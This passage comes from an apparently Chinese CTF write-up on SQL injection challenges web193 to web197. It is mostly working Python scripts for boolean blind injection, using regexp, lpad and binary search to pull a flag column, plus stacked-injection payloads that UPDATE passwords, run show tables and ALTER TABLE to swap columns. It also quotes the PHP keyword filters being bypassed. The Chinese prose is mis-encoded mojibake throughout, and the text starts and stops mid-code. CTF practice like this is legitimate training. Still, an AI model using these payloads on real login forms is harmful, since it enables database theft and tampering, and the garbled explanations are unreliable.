right()</code>ÔºåÂÖ∂ÂÆû‰πüÂèØ‰ª•Áî®<code>mid()</code>ÔºåËøôÈáåÂ∞ÜÊï∞ÊçÆÂ∫ìÂêçÂ≠óÁªôÊîπ‰∫ÜÔºåÂíå192ÁöÑ‰∏ç‰∏ÄÊ†∑ÔºåÈúÄË¶ÅÈáçÊñ∞ÊûÑÈÄ†‰∏Ä‰∏™Áî®Êù•Êü•ËØ¢ÁöÑËØ≠Âè•„ÄÇ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://df755a50-9318-495a-9788-1c5c721b44e2.challenge.ctf.show:8080/api/"</span>flagstr<span class="token operator">=</span><span class="token string">"abcdefghijklmnopqrstuvwxyz1234567890_&#123;-&#125; ,"</span>flag<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        change<span class="token operator">=</span>flag<span class="token operator">+</span>j        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(left((select group_concat(f1ag)from ctfshow_flxg),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>change<span class="token punctuation">&#125;</span></span><span class="token string">'),1,0)=1#"</span></span>        <span class="token comment">#payload = f"admin' and if((select group_concat(f1ag)from ctfshow_flxg)regexp('&#123;change&#125;'),1,0)=1#"</span>        <span class="token comment">#Á¨¨‰∫å‰∏™payloadÊ≤°Êúâ‰ΩøÁî®Êà™Êñ≠Â≠óÁ¨¶‰∏≤ÁöÑÂáΩÊï∞ÔºåÁõ¥Êé•‰ΩøÁî®regexpËøõË°åÁöÑÂåπÈÖç</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"ÂØÜÁ†ÅÈîôËØØ"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p>ÂèØ‰ª•Â∞ÜpayloadÁöÑleftÁªôÂéªÊéâÔºåÁõ¥Êé•Ê≠£ÂàôÂåπÈÖçÔºå‰∏çËøáÈúÄË¶ÅËµ∑‰∏Ä‰∏™‚Äôctfshow{‚ÄòÁöÑÂ§¥Â∞±Ë°åÂ∞±Ë°å„ÄÇY4Â§ß‰Ω¨ÁöÑÂÅöÊ≥ïÊòØÔºåÂ∞Ü<code>&#123;</code>ÊîæÂà∞‰∫Ü<code>flagstr</code>ÁöÑÂâçËæπ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"https://d8ecee4e-9c33-46b3-af79-befbc602b859.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">'ctf'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        <span class="token comment"># Êü•Êï∞ÊçÆÂ∫ì  ctfshow_flxg,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•Â≠óÊÆµ  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_flxg"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"ÂØÜÁ†ÅÈîôËØØ"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>‰∫åÂàÜÊ≥ï‰æùÁÑ∂ÂèØË°åÔºåÂè™ÊòØÂπ∂‰∏çÊòØÂçïÁã¨ÁöÑÂ≠óÁ¨¶ÊØîËæÉÔºåÊòØÂ≠óÁ¨¶‰∏≤ÁöÑÊØîËæÉÔºå‰ΩÜÂéüÁêÜÊòØ‰∏ÄÊ†∑ÁöÑ„ÄÇ<br>Âç≥Ôºöab&#x3D;abÔºåab&lt;acÔºåÊòØÂØπÂ≠óÁ¨¶‰∏≤‰∏ç‰∏ÄËá¥ÁöÑÁ¨¨‰∏ÄÂ≠óÁ¨¶ËøõË°åÊØîËæÉ„ÄÇ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://fa58a58a-11d4-4c3e-9009-e7a0c53565b8.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)&lt;'&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> mid </code></pre><h4 id="web194-lpad"><a href="#web194-lpad" class="headerlink" title="web194(lpad)"></a>web194(lpad)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:ÊÑüËßâÂ∞ë‰∫Ü‰∏™Âï•ÔºåÂ•áÊÄ™</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex|substr|char|left|right|substring/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Áî®Êà∑ÂêçÈùûÊ≥ï'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>left</code> <code>right</code>Ë¢´ban‰∫ÜÔºåÂèØ‰ª•Áõ¥Êé•Ê≠£ÂàôÂåπÈÖçÔºå‰∏çËøáÁõ¥Êé•Ê≠£ÂàôÁöÑÊñπÊ≥ïÊúâÂ±ÄÈôê</p><p>Êâæ‰∏ÄÊâæÂÖ∂‰ªñÂíåÊà™ÂèñÊúâÂÖ≥ÁöÑÂáΩÊï∞ÔºåÂèëÁé∞<code>lpad()</code>„ÄÇ</p><p><code>lpad(str,len,padstr)</code><br><code>lpad()</code>ÂáΩÊï∞ËøîÂõûÂ≠óÁ¨¶‰∏≤<code>str</code>Ôºå<code>len</code>Â∞è‰∫éÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶Áõ∏ÂΩì‰∫éÂ≠óÁ¨¶‰∏≤Êà™ÂèñÔºõÂ§ß‰∫éÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶ÔºåÂàôÂú®Â∑¶Â°´ÂÖÖÁî®Â≠óÁ¨¶‰∏≤<code>padstr</code>Áõ¥Âà∞ËææÂà∞<code>len</code>Â≠óÁ¨¶ÈïøÂ∫¶„ÄÇ</p><p>ÊúâÂ∑¶Â°´ÂÖÖÔºå‰∏ÄËà¨Â∞±ÊòØÂè≥Â°´ÂÖÖÔºåÊâæÂà∞<code>rpad()</code>ÔºåÁî®Ê≥ïÂíå<code>lpad()</code>Á±ª‰ºº„ÄÇ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://8be98a09-12b0-4f66-807f-899826d58216.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">",_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789"</span>tempstr <span class="token operator">=</span> <span class="token string">""</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment">#payload = "admin'and ((lpad((select database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_flxg</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,'')='&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            tempstr <span class="token operator">+=</span> mid            flag <span class="token operator">+=</span> mid            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web195-Â†ÜÂè†Ê≥®ÂÖ•"><a href="#web195-Â†ÜÂè†Ê≥®ÂÖ•" class="headerlink" title="web195(Â†ÜÂè†Ê≥®ÂÖ•)"></a>web195(Â†ÜÂè†Ê≥®ÂÖ•)</h4><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂØÜÁ†ÅÊ£ÄÊµã</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ÂØÜÁ†ÅÂè™ËÉΩ‰∏∫Êï∞Â≠ó'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//ÂØÜÁ†ÅÂà§Êñ≠</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ÁôªÈôÜÊàêÂäü'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//TODO:ÊÑüËßâÂ∞ë‰∫Ü‰∏™Âï•ÔºåÂ•áÊÄ™,‰∏ç‰ºöÂèàÂèåÂèíÂèïË¢´‰∏ÄË°Ä‰∫ÜÂêß</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Áî®Êà∑ÂêçÈùûÊ≥ï'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"ÁôªÈôÜÊàêÂäü flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>ËøáÊª§‰∫ÜselectÔºåÂçïÂèåÂºïÂè∑‰πüË¢´ËøáÊª§ÔºåÊ≤°ÊúâÊä•ÈîôÊèêÁ§∫„ÄÇ</p><p>Ê≤°ÊúâËøáÊª§ÂàÜÂè∑ÔºåËÄÉËôëÂ†ÜÂè†Ê≥®ÂÖ•„ÄÇ‰ΩÜ‰∏çËÉΩÊúâÁ©∫Ê†ºÔºåÂèØ‰ª•ÈÄöËøáÂèçÂºïÂè∑ÂåÖË£πË°®ÂêçÁ≠â‰ø°ÊÅØÁöÑÊñπÂºèÁªïËøáÁ©∫Ê†ºËøáÊª§„ÄÇ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">update</span><span class="token identifier"><span class="token punctuation">`</span>ctfshow_user<span class="token punctuation">`</span></span><span class="token keyword">set</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span></code></pre><p>ËøôÈáåÁî®updateÂ∞ÜpassÊîπ‰∏∫1ÔºåÂèØ‰ª•ÁôªÈôÜÊàêÂäü</p><p>Âõ†‰∏∫Êü•ËØ¢ËØ≠Âè•ÁöÑwhereÂà§Êñ≠ÊòØ<code>username=&#123;$username&#125;</code>ÔºåÂπ∂Ê≤°ÊúâÂºïÂè∑ÂåÖË£πÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•ËæìÂÖ•Êï∞Â≠ó‰∫Ü„ÄÇ</p><p>sqlÈáåÔºåÊï∞Â≠óÂíåÂ≠óÁ¨¶‰∏≤ÁöÑÂåπÈÖçÊòØÂº±Á±ªÂûãÊØîËæÉÔºåÂ≠óÁ¨¶‰∏≤‰ºöËΩ¨Êç¢‰∏∫Êï∞Â≠óÔºåÂ¶Ç<code>0==admin</code>ÔºåÈÇ£‰πàÂ¶ÇÊûúËæìÂÖ•ÁöÑusernameÊòØ0ÔºåÂàô‰ºöÂåπÈÖçÊâÄÊúâÂºÄÂ§¥‰∏ç</p><p>ÊòØÊï∞Â≠óÊàñËÄÖ‰∏∫0ÁöÑÂ≠óÁ¨¶‰∏≤ÂíåÊï∞Â≠ó0</p><p>‰ΩÜÊòØÂèØ‰ª•‰ΩøÁî®Âè¶‰∏ÄÁßçÊñπÊ≥ï</p><pre class="language-sql" data-language="sql"><code class="language-sql">payload<span class="token operator">=</span><span class="token string">"0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"</span><span class="token comment"># Ëá≥‰∫é‰∏∫‰ªÄ‰πàÈùûÂæóÁî®ÂçÅÂÖ≠ËøõÂà∂ÁôªÂΩïÔºåÊòØÂõ†‰∏∫‰∏ãÈù¢Ëøô‰∏™Ê≤°ÊúâÂ≠óÁ¨¶‰∏≤ÂçïÂºïÂè∑ÂåÖÂõ¥</span><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = &#123;$username&#125;;"</span><span class="token punctuation">;</span></code></pre><h4 id="web196-select-row-0"><a href="#web196-select-row-0" class="headerlink" title="web196(select row[0])"></a>web196(select row[0])</h4><p>ËøôÈÅìÈ¢òÁõÆÁöÑselectËôΩÁÑ∂ÂÜôÁöÑÊòØË¢´ËøáÊª§‰∫ÜÔºå‰ΩÜÊòØÂÆûÈôÖÂπ∂Ê≤°ÊúâË¢´ËøáÊª§„ÄÇÔºàÊ†πÊçÆÁæ§ÈáåÁöÑÂèçÈ¶àÔºåËØ¥Áæ§‰∏ªÊú¨Êù•ÊòØÊâìÁÆóÊääËøáÊª§selectÂÜôÊàêse1ectÔºå‰ΩÜÊòØ</p><p>ÂøòËÆ∞Êîπ‰∫Ü„ÄÇ‰∏çËøáse1ect‰πüÂπ∂Ê≤°ÊúâË¢´ËøáÊª§ÔºåÊÑüËßâÁ∫ØÁ≤πÂ∞±ÊòØÊ≤°ÊúâÂä†selectÁöÑËøáÊª§ÔΩûÔºâ</p><p>ÂèØ‰ª•Áî®selectÁªïËøápasswordÁöÑifÂà§Êñ≠„ÄÇ</p><p>Âà§Êñ≠Êù°‰ª∂Êª°Ë∂≥ÁöÑËÆæÂÆöÊòØ<code>$row[0]==$password</code>Ôºå$rowÂ≠òÂÇ®ÁöÑÊòØÁªìÊûúÈõÜ‰∏≠ÁöÑ‰∏ÄË°åÊï∞ÊçÆÔºå$row[0]Â∞±ÊòØËøô‰∏ÄË°åÁöÑÁ¨¨‰∏Ä‰∏™Êï∞ÊçÆ„ÄÇÊó¢ÁÑ∂ÂèØ‰ª•Â†ÜÂè†Ê≥®</p><p>ÂÖ•ÔºåÂ∞±ÊòØÂèØ‰ª•Â§öËØ≠Âè•Êü•ËØ¢Ôºå$rowÂ∫îËØ•‰πü‰ºöÈÄê‰∏ÄÂæ™ÁéØËé∑ÂèñÊØè‰∏™ÁªìÊûúÈõÜ„ÄÇ</p><p>ÈÇ£‰πàÂèØ‰ª•ËæìÂÖ•username‰∏∫<code>1;select(9)</code>Ôºåpassword‰∏∫9„ÄÇÂΩì$rowËé∑ÂèñÂà∞Á¨¨‰∫å‰∏™Êü•ËØ¢ËØ≠Âè•select(9)ÁöÑÁªìÊûúÈõÜÊó∂ÔºåÂç≥ÂèØËé∑Âæó$row[0]&#x3D;9ÔºåÈÇ£</p><p>‰πàpasswordËæìÂÖ•9Â∞±ÂèØ‰ª•Êª°Ë∂≥Êù°‰ª∂Âà§Êñ≠„ÄÇÂêåÊ†∑ËæìÂÖ•ÂÖ∂‰ªñÂØÜÁ†Å‰πüÂèØ‰ª•</p><h4 id="web197-alert‰øÆÊîπÂ≠óÊÆµ-show-tables-drop"><a href="#web197-alert‰øÆÊîπÂ≠óÊÆµ-show-tables-drop" class="headerlink" title="web197(alert‰øÆÊîπÂ≠óÊÆµ  show tables  drop)"></a>web197(alert‰øÆÊîπÂ≠óÊÆµ  show tables  drop)</h4><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:ÊÑüËßâÂ∞ë‰∫Ü‰∏™Âï•ÔºåÂ•áÊÄ™,‰∏ç‰ºöÂèàÂèåÂèíÂèïË¢´‰∏ÄË°Ä‰∫ÜÂêß</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Áî®Êà∑ÂêçÈùûÊ≥ï'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"ÁôªÈôÜÊàêÂäü flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>ËøôÊ¨°selectË¢´ban‰∫Ü</p><p><strong>ÊñπÊ≥ï‰∏Ä</strong></p><p>Âà©Áî®<code>show</code>„ÄÇÊ†πÊçÆÈ¢òÁõÆÁªôÁöÑÊü•ËØ¢ËØ≠Âè•ÔºåÂèØ‰ª•Áü•ÈÅìÊï∞ÊçÆÂ∫ìÁöÑË°®Âêç‰∏∫ctfshow_userÔºåÈÇ£‰πàÂèØ‰ª•ÈÄöËøá<code>show tables</code>ÔºåËé∑ÂèñË°®ÂêçÁöÑÁªìÊûúÈõÜÔºåÂú®Ëøô‰∏™</p><p>ÁªìÊûúÈõÜÈáåÂÆöÁÑ∂Êúâ‰∏ÄË°åÁöÑÊï∞ÊçÆ‰∏∫ctfshow_user„ÄÇ</p><p>Áî®Êà∑ÂêçÔºö<code>1;show tables</code></p><p>ÂØÜÁ†ÅÔºö<code>ctfshow_user</code></p><p><strong>ÊñπÊ≥ï‰∫å</strong></p><p>ÂèØ‰ª•Âà©Áî®<code>alter</code>‰øÆÊîπÂ≠óÊÆµÂêçÔºåÊää<code>id</code>Âíå<code>pass</code>ÂØπË∞ÉÔºåÁÑ∂ÂêéÁàÜÁ†¥id„ÄÇ</p><p><strong>ALTER TABLE</strong> ËØ≠Âè•Áî®‰∫éÂú®Â∑≤ÊúâÁöÑË°®‰∏≠Ê∑ªÂä†„ÄÅ‰øÆÊîπÊàñÂà†Èô§Âàó„ÄÇ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change column &#96;pass&#96; &#96;a&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;a&#96; &#96;id&#96; varchar(255)</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1a4c8604-7c24-4000-a07a-b9c23f8c0ca3.challenge.ctf.show/api/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        